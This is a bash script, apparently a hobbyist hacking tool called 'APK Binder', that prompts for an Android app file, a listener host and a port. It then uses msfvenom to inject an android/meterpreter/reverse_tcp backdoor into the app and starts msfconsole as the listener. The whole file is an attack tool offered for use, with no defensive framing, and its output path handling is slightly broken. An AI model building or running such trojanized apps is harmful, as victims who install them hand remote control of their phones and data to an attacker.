#Author - github.com/mhdashik00
#Credit - Give me credit if you use any part of script
clear
#Banner Start
echo -e "\e[31m                                                              \e[0m"
echo -e "\e[31m ▄▄▄       ██▓███   ██ ▄█▀ ▄▄▄▄    ██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  \e[0m";
echo -e "\e[31m▒████▄    ▓██░  ██▒ ██▄█▒ ▓█████▄ ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒\e[0m";
echo -e "\e[31m▒██  ▀█▄  ▓██░ ██▓▒▓███▄░ ▒██▒ ▄██▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒\e[0m";
echo -e "\e[31m░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  \e[0m";
echo -e "\e[31m ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄░▓█  ▀█▓░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒\e[0m";
echo -e "\e[31m ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\e[0m";
echo -e "\e[31m  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░\e[0m";
echo -e "\e[31m  ░   ▒   ░░       ░ ░░ ░  ░    ░  ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ \e[0m";
echo -e "\e[31m      ░  ░         ░  ░    ░       ░           ░    ░       ░  ░   ░     \e[0m";
echo -e "\e[31m                                ░                 ░                      \e[0m";
echo -e " Author  = github.com/mhdashik00               "
echo -e "\e[34m instagram : https://instagram.com/__mhd.ashik            \e[0m "
echo -e "\e[49m                                 \e[2m"

#Bind Backdoor
read -p "[*]Enter filepath of apk#~: " path
read -p "[*]Enter output payload name#~: " payload
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
sudo apt-get install apktool
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $path/binded.apk
echo "done"
#start listner

msfconsole
#dont copy this code withou credit